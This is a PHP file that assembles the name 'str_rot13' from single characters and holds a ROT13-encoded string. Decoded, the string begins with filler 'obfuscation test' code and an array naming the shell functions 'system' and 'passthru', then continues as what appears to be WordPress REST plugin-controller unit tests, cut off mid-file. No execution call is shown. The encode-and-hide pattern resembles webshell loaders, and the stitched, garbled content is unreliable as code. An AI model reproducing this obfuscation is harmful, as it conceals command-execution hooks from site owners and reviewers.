<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Cyhtvaf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff JC_ERFG_Cyhtvaf_Pbagebyyre_Grfg rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	pbafg ONFR        = '/jc/i2/cyhtvaf';
	pbafg CYHTVA      = 'grfg-cyhtva/grfg-cyhtva';
	pbafg CYHTVA_SVYR = frys::CYHTVA . '.cuc';

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $fhofpevore_vq;

	/**
	 * Fhcre nqzvavfgengbe hfre VQ.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $fhcre_nqzva;

	/**
	 * Nqzvavfgengbe hfre vq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $nqzva;

	/**
	 * WFBA qrpbqrq erfcbafr sebz gur JbeqCerff.bet cyhtva NCV.
	 *
	 * @ine fgqPynff
	 */
	cevingr fgngvp $cyhtva_ncv_qrpbqrq_erfcbafr;

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		frys::$fhcre_nqzva   = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$nqzva         = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);

		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$fhcre_nqzva );
		}

		frys::$cyhtva_ncv_qrpbqrq_erfcbafr = wfba_qrpbqr( svyr_trg_pbagragf( QVE_GRFGQNGN . '/cyhtvaf/yvax-znantre.wfba' ) );
	}

	/**
	 * Pyrna hc grfg svkgherf.
	 *
	 * @fvapr 5.5.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
		frys::qryrgr_hfre( frys::$fhcre_nqzva );
		frys::qryrgr_hfre( frys::$nqzva );
	}

	choyvp shapgvba grne_qbja() {
		vs ( svyr_rkvfgf( JC_CYHTVA_QVE . '/grfg-cyhtva/grfg-cyhtva.cuc' ) ) {
			// Erzbir cyhtva svyrf.
			$guvf->ezqve( JC_CYHTVA_QVE . '/grfg-cyhtva' );
			// Qryrgr rzcgl qverpgbel.
			ezqve( JC_CYHTVA_QVE . '/grfg-cyhtva' );
		}

		vs ( svyr_rkvfgf( QVE_GRFGQNGN . '/yvax-znantre.mvc' ) ) {
			hayvax( QVE_GRFGQNGN . '/yvax-znantre.mvc' );
		}

		vs ( svyr_rkvfgf( JC_CYHTVA_QVE . '/yvax-znantre/yvax-znantre.cuc' ) ) {
			// Erzbir cyhtva svyrf.
			$guvf->ezqve( JC_CYHTVA_QVE . '/yvax-znantre' );
			// Qryrgr rzcgl qverpgbel.
			ezqve( JC_CYHTVA_QVE . '/yvax-znantre' );
		}

		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( frys::ONFR, $ebhgrf );
		$guvf->nffregNeenlUnfXrl( frys::ONFR . '/(?C<cyhtva>[^.\/]+(?:\/[^.\/]+)?)', $ebhgrf );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', frys::ONFR );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$vgrzf = jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) );

		$guvf->nffregPbhag( 1, $vgrzf );
		$guvf->purpx_trg_cyhtva_qngn( neenl_fuvsg( $vgrzf ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'frnepu' => 'grfgrebav' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'frnepu' => 'Pbby' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregPbhag( 1, jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_fgnghf() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'fgnghf' => 'vanpgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregPbhag( 1, jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'fgnghf' => 'npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregPbhag( 0, jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_fgnghf_zhygvcyr() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'fgnghf' => neenl( 'vanpgvir', 'npgvir' ) ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregTerngreGuna( 0, pbhag( jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ), 'ABG' ) ) );
		$guvf->nffregPbhag( 1, jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_fgnghf_argjbex_npgvir() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'fgnghf' => 'argjbex-npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregPbhag( 0, jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) ) );

		npgvingr_cyhtva( frys::CYHTVA_SVYR, '', gehr );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'fgnghf' => 'argjbex-npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregPbhag( 1, jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_ybttrq_bhg() {
		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_vafhssvpvrag_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR );
		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_pnaabg_trg_vgrzf_vs_cyhtvaf_zrah_abg_ninvynoyr() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj_cyhtvaf', $erfcbafr->nf_reebe(), 403 );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_vs_cyhtvaf_zrah_ninvynoyr() {
		$guvf->perngr_grfg_cyhtva();
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_rkpyhqrf_argjbex_bayl_cyhtva_vs_abg_npgvir() {
		$guvf->perngr_grfg_cyhtva( gehr );
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$vgrzf = jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) );
		$guvf->nffregPbhag( 0, $vgrzf );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_qbrf_abg_rkpyhqr_argjbex_bayl_cyhtva_vs_abg_npgvir_ba_fvatyr_fvgr() {
		$guvf->perngr_grfg_cyhtva( gehr );
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$vgrzf = jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) );
		$guvf->nffregPbhag( 1, $vgrzf );
		$guvf->purpx_trg_cyhtva_qngn( neenl_fuvsg( $vgrzf ), gehr );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrzf_qbrf_abg_rkpyhqr_argjbex_bayl_cyhtva_vs_abg_npgvir_ohg_unf_argjbex_pncf() {
		$guvf->perngr_grfg_cyhtva( gehr );
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$vgrzf = jc_yvfg_svygre( $erfcbafr->trg_qngn(), neenl( 'cyhtva' => frys::CYHTVA ) );
		$guvf->nffregPbhag( 1, $vgrzf );
		$guvf->purpx_trg_cyhtva_qngn( neenl_fuvsg( $vgrzf ), gehr );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR . '/' . frys::CYHTVA );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->purpx_trg_cyhtva_qngn( $erfcbafr->trg_qngn() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrz_ybttrq_bhg() {
		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR . '/' . frys::CYHTVA );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrz_vafhssvpvrag_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR . '/' . frys::CYHTVA );
		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_pnaabg_trg_vgrz_vs_cyhtvaf_zrah_abg_ninvynoyr() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_ivrj_cyhtva', $erfcbafr->nf_reebe(), 403 );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrz_vs_cyhtvaf_zrah_ninvynoyr() {
		$guvf->perngr_grfg_cyhtva();
		$guvf->ranoyr_cyhtvaf_zrah_vgrz();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR . '/' . frys::CYHTVA );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq_cyhtva() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$erfcbafr = erfg_qb_erdhrfg( frys::ONFR . '/' . frys::CYHTVA );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$guvf->frghc_cyhtva_qbjaybnq();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fyht' => 'yvax-znantre' ) );

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'Yvax Znantre', $erfcbafr->trg_qngn()['anzr'] );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_naq_npgvingr() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$guvf->frghc_cyhtva_qbjaybnq();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'   => 'yvax-znantre',
				'fgnghf' => 'npgvir',
			)
		);

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'Yvax Znantre', $erfcbafr->trg_qngn()['anzr'] );
		$guvf->nffregGehr( vf_cyhtva_npgvir( 'yvax-znantre/yvax-znantre.cuc' ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_naq_npgvingr_reebef_vs_ab_crezvffvba_gb_npgvingr_cyhtva() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$guvf->frghc_cyhtva_qbjaybnq();
		$guvf->qvfnoyr_npgvingr_crezvffvba( 'yvax-znantre/yvax-znantre.cuc' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'   => 'yvax-znantre',
				'fgnghf' => 'npgvir',
			)
		);

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_npgvingr_cyhtva', $erfcbafr );
		$guvf->nffregSnyfr( vf_cyhtva_npgvir( 'yvax-znantre/yvax-znantre.cuc' ) );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_naq_argjbex_npgvingr_erwrpgrq_vs_abg_zhygvfvgr() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$guvf->frghc_cyhtva_qbjaybnq();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'   => 'yvax-znantre',
				'fgnghf' => 'argjbex-npgvir',
			)
		);

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_naq_argjbex_npgvingr() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$guvf->frghc_cyhtva_qbjaybnq();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'   => 'yvax-znantre',
				'fgnghf' => 'argjbex-npgvir',
			)
		);

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 'Yvax Znantre', $erfcbafr->trg_qngn()['anzr'] );
		$guvf->nffregGehr( vf_cyhtva_npgvir_sbe_argjbex( 'yvax-znantre/yvax-znantre.cuc' ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_ybttrq_bhg() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fyht' => 'yvax-znantre' ) );

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_vafhssvpvrag_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fyht' => 'yvax-znantre' ) );

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_pnaabg_perngr_vgrz_vs_abg_fhcre_nqzva() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fyht' => 'yvax-znantre' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_vafgnyy_cyhtva', $erfcbafr->nf_reebe(), 403 );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_jqbgbet_haernpunoyr() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fyht' => 'sbb' ) );

		$guvf->cerirag_erdhrfgf_gb_ubfg( 'ncv.jbeqcerff.bet' );

		$guvf->rkcrpgJneavat();
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'cyhtvaf_ncv_snvyrq', $erfcbafr, 500 );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_perngr_vgrz_haxabja_cyhtva() {
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		nqq_svygre(
			'cer_uggc_erdhrfg',
			fgngvp shapgvba () {
				/*
				 * Zbpxf gur erdhrfg gb:
				 * uggcf://ncv.jbeqcerff.bet/cyhtvaf/vasb/1.2/?npgvba=cyhtva_vasbezngvba&erdhrfg%5Ofyht%5Q=nyrk-fnlf-guvf-oybpx-qrsvavgryl-qbrfag-rkvfg&erdhrfg%5Osvryqf%5Q%5Ofrpgvbaf%5Q=0&erdhrfg%5Osvryqf%5Q%5Oynathntr_cnpxf%5Q=1&erdhrfg%5Oybpnyr%5Q=ra_HF&erdhrfg%5Ojc_irefvba%5Q=5.9
				 */
				erghea neenl(
					'urnqref'  => neenl(),
					'erfcbafr' => neenl(
						'pbqr'    => 404,
						'zrffntr' => 'Abg Sbhaq',
					),
					'obql'     => '{\"reebe\":\"Cyhtva abg sbhaq.\"}',
					'pbbxvrf'  => neenl(),
					'svyranzr' => ahyy,
				);
			}
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', frys::ONFR );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fyht' => 'nyrk-fnlf-guvf-oybpx-qrsvavgryl-qbrfag-rkvfg' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		// Vf guvf na nccebcevngr fgnghf?
		$guvf->nffregReebeErfcbafr( 'cyhtvaf_ncv_snvyrq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_ybttrq_bhg() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 401, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_vafhssvpvrag_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_pnaabg_hcqngr_vgrz_vs_cyhtvaf_zrah_abg_ninvynoyr() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$nqzva );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_znantr_cyhtvaf', $erfcbafr->nf_reebe(), 403 );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_npgvingr_cyhtva() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( vf_cyhtva_npgvir( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_npgvingr_cyhtva_snvyf_vs_ab_npgvingr_pnc() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );
		$guvf->qvfnoyr_npgvingr_crezvffvba( frys::CYHTVA_SVYR );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_npgvingr_cyhtva', $erfcbafr, 403 );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_argjbex_npgvingr_cyhtva_erwrpgrq_vs_abg_zhygvfvgr() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'argjbex-npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_argjbex_npgvingr_cyhtva() {
		$guvf->perngr_grfg_cyhtva();
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'argjbex-npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregGehr( vf_cyhtva_npgvir_sbe_argjbex( frys::CYHTVA_SVYR ) );
	}

	/**
	 * @tebhc zf-erdhverq
	 * @gvpxrg 50321
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_argjbex_npgvingr_cyhtva_gung_jnf_npgvir_ba_fvatyr_fvgr() {
		$guvf->perngr_grfg_cyhtva();
		npgvingr_cyhtva( frys::CYHTVA_SVYR );
		jc_frg_pheerag_hfre( frys::$fhcre_nqzva );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', frys::ONFR . '/' . frys::CYHTVA );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fgnghf' => 'argjbex-npgvir' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
